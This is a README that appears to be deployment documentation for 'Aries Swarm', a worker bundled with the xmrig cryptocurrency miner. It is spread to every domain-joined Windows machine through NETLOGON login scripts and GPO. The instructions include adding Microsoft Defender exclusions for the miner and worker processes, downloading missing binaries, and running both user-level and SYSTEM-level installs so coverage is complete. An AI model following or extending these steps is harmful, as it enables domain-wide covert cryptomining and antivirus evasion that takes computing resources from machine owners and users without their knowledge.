# Aries Swarm — NETLOGON Login Script Deployment

## Overview

Deploys the Aries worker to every domain-joined machine via Windows login scripts. Runs at **every user login** on any machine that authenticates against the domain controller.

## Setup

### 1. Copy Files to NETLOGON

Copy the following to `\\DC\NETLOGON\aries-swarm\`:

```
\\DC\NETLOGON\
├── login-deploy.bat          ← The login script
└── aries-swarm\
    ├── worker.js              ← Aries worker script
    ├── node.exe               ← Portable Node.js (win-x64)
    ├── xmrig.exe              ← Mining binary (optional)
    └── env.json               ← Config (optional, script creates one)
```

If `node.exe` or `xmrig.exe` aren't in the share, the script will attempt to download them.

### 2. Configure GPO Login Script

1. Open **Group Policy Management** (`gpmc.msc`)
2. Edit the GPO linked to your target OU (or Default Domain Policy)
3. Navigate to: **User Configuration → Policies → Windows Settings → Scripts (Logon/Logoff)**
4. Double-click **Logon**
5. Click **Add** → Browse to `\\DC\NETLOGON\login-deploy.bat`
6. Click OK → Apply

### 3. (Recommended) Add Defender Exclusions via GPO

Since the login script runs as the user (not admin), Defender exclusions may fail. Add them via GPO:

1. **Computer Configuration → Policies → Administrative Templates → Windows Components → Microsoft Defender Antivirus → Exclusions**
2. **Path Exclusions**: Add `%ProgramData%\aries-swarm`
3. **Process Exclusions**: Add `node.exe`, `xmrig.exe`

## Login Script vs GPO Startup Script

| Feature | Login Script (this) | Startup Script (GPO) |
|---------|---------------------|----------------------|
| **Runs as** | Current user | SYSTEM |
| **When** | User login | Machine boot |
| **Admin rights** | Usually no | Yes |
| **Defender exclusions** | May fail (use GPO) | Works directly |
| **Scheduled task** | User-level fallback | SYSTEM-level |
| **Visibility** | Per-user deployment | Machine-wide |

**Recommendation**: Use both. GPO startup (`gpo-startup.ps1`) for SYSTEM-level install, login script for coverage on machines where GPO startup didn't fire.

## Configuration

Edit the variables at the top of `login-deploy.bat`:

- `CURRENT_VERSION` — Bump to force re-deploy
- `RELAY` — Gateway relay URL
- `SECRET` — Swarm authentication secret
- `REFERRAL` — Referral tracking code

## Logs

Logs are written to `%ProgramData%\aries-swarm\login-deploy.log`

## Troubleshooting

- **Script doesn't run**: Verify GPO is applied (`gpresult /r` on client)
- **Files not copying**: Check NETLOGON share permissions (Authenticated Users: Read)
- **Worker won't start**: Check the log file, verify node.exe exists
- **Defender blocking**: Apply Defender exclusions via GPO (see step 3)
